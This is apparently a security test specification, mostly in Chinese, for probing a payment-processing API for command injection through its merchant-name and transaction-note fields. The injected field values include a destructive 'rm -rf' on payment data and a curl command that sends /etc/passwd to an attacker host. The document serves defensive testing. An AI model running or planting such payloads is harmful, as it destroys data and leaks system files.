# Security Probe S_I_02: 注入攻击测试 - Code Execution via Payment Fields

## 探针类型
注入攻击测试 (Injection)

## 测试目标
验证支付处理系统在处理支付请求时，能否防止通过交易字段注入恶意代码导致的意外代码执行。攻击者通过在商户名称、交易备注等自由文本字段中注入shell命令，试图在支付服务器上执行任意代码。

## 探针设计

### 输入构造
- **输入场景**: 支付请求中的非结构化文本字段包含命令注入payload，系统在处理这些字段时未做适当的输入清理
- **输入数据**: 
  - 商户名称: "AcmeInc; rm -rf /var/payment_data/*"
  - 交易备注: "Order #123 || curl -d @/etc/passwd https://attacker-server.com/exfil"
  - 金额: $49.99
- **输入方式**: 通过支付处理API提交，商户名称和交易备注字段包含注入payload

### 执行步骤
1. **准备阶段**: 构造包含命令注入payload的支付请求
2. **执行阶段**: 
   - 步骤1: 提交包含注入payload的支付请求
   - 步骤2: 观察系统是否在shell、eval、子进程或数据库查询中使用了这些未净化的字段
   - 步骤3: 检查系统日志和文件系统是否被篡改
3. **分析阶段**: 分析系统日志中是否有意外的命令执行痕迹；检查文件系统完整性；检查是否有数据外发连接
4. **判定阶段**: 判定系统是否对用户输入字段进行了充分的净化和安全处理

## 预期行为
- 所有用户输入字段应在使用前进行严格净化和参数化
- 商户名称和交易备注仅作为数据存储，不应被传递到shell执行、eval或动态查询中
- 任何尝试的注入攻击应被检测和阻断，并记录安全事件
- 系统不应在日志或错误消息中回显原始的注入payload

## 判定标准
- **通过**: 系统安全处理了所有包含恶意payload的字段，没有执行非预期的命令；注入payload仅被作为无害数据存储或显示；安全日志记录了注入尝试
- **失败**: 系统执行了通过支付字段注入的命令，导致文件删除、数据泄露或其他意外代码执行

## 相关风险
- 风险等级: 严重
- 影响范围: 所有处理用户输入的处理流程
- 修复建议: 对所有自由文本字段实施输入验证和净化；禁止在支付处理流程中使用shell执行、eval或动态代码执行；对日志和错误消息中的用户输入进行转义
